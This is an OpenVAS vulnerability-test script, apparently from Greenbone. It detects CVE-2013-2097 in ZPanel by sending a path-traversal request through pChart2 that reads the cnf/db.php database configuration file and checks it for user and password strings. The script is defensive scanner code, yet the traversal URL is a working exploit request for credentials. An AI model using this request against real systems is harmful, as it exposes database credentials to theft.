###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zpanel_59284.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# ZPanel Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zpanel:zpanel";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105415");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2013-2097");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("ZPanel Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/134030");

  script_tag(name:"vuldetect", value:"Try to read 'cnf/db.php' via a special crafted HTTP GET request");
  script_tag(name:"insight", value:"The vulnerability is due to a vulnerable version of pChart allowing remote, unauthenticated, users to read arbitrary files found on the filesystem.");
  script_tag(name:"solution", value:"Updates are available");
  script_tag(name:"summary", value:"ZPanel is prone to a remote information disclosure vulnerability.");
  script_tag(name:"affected", value:"Zpanel <= 10.1.0");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-10-21 11:32:00 +0200 (Wed, 21 Oct 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_zpanel_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zpanel/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/etc/lib/pChart2/examples/index.php?Action=View&Script=../../../../cnf/db.php';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

buf = str_replace( string:buf, find:"&nbsp;", replace:" " );

if( "Database configuration file" >< buf && "$user" >< buf && "$pass" >< buf )
{
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
